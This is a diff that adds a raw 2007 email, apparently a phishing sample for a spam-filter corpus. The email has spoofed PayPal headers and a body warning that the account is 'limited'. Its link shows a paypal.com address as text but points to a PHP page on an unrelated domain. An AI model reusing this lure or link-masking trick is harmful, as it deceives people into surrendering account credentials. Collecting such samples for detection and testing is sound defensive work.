@@ -1,0 +1,69 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 5AE27468F1
+ for <user@login.example.com>; Fri, 13 Apr 2007 01:24:53 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 5375C131FB53
+ for <user@example.com>; Fri, 13 Apr 2007 01:24:53 -0400 (EDT)
+Received: from mail.fpde.ru (mail.fpde.ru [217.23.131.194])
+ by mail.example.org (Postfix) with ESMTP id 3928F6FA1C1
+ for <user@example.com>; Fri, 13 Apr 2007 01:24:53 -0400 (EDT)
+Received: from [41.244.33.89] (helo=User)
+ by mail.fpde.ru with esmtpa (Exim 4.44 (FreeBSD))
+ id 1HcEgI-0008CB-I1; Fri, 13 Apr 2007 09:50:47 +0400
+Reply-To: <no-reply@paypal.com>
+From: "PayPal Inc."<service@paypal.com>
+Subject: Your accont has been flagged
+Date: Fri, 13 Apr 2007 07:33:37 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070413052453.3928F6FA1C1@mail.example.org>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1117
+
+<html><title>PayPal Inc.</title>
+<table width="600" border="0" cellpadding="0" cellspacing="0">
+<td height="33" width="105" background=http://www.paypal.com/images/paypal_logo.gif></td>
+<td width="420"><td>
+</table>
+<table width="600" border="0" cellpadding="0" cellspacing="0">
+<tr bgcolor="#336699"><td>&nbsp;</td></tr>
+</table>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+<font size="2" face="verdana" color="#000000"><br>
+PayPal is constantly working to ensure security by regularly screening the accounts in our system. We recently reviewed your account, and we need more information to help us provide you with secure service. Until we can collect this information, your access to sensitive account features will be limited. We would like to restore your access as soon as possible, and we apologize for the inconvenience. 
+<br><br>
+Why is my account access limited?
+<br><br>
+Your account access has been limited for the following reason(s):
+<br><br>
+<strong>April, 2007:</strong> We have reason to believe that your account was accessed by a third party. Because protecting the security of your account is our primary concern, we have limited access to sensitive PayPal account features. We understand that this may be an inconvenience but please understand that this temporary limitation is for your protection. 
+<br><br>
+(Your case ID for this reason is PP-257-057-154.)
+<br><br>
+
+<P>To remove the limitation click on the following link:&nbsp;<BR></P>
+<P><A href="http://www.mtbireland.com/templates/xboxblack/rst.php"
+target=_blank>https://www.paypal.com/cgi-bin/webscr?cmd=_resolution-center</A></P> <br>
+Regards,<br>
+<font color="#003366"><strong>PayPal Security Departament</strong></font>
+<tr><td>
+<hr size=2 width=100% color=#cccccc style='border: dotted;'>
+</td></tr>
+</table><TABLE cellSpacing=0 cellPadding=0 width=600 border=0><td><P>
+<font color="#cccccc" size="1">
+Copyright &copy; 2007 PayPal Inc. All rights reserved. Designated trademarks and brands are the property of their respective owners. PayPal is located at 2211 N. First St., San Jose, CA 95131.
+</SPAN></SPAN>
+</FONT></P></td></TABLE></html>
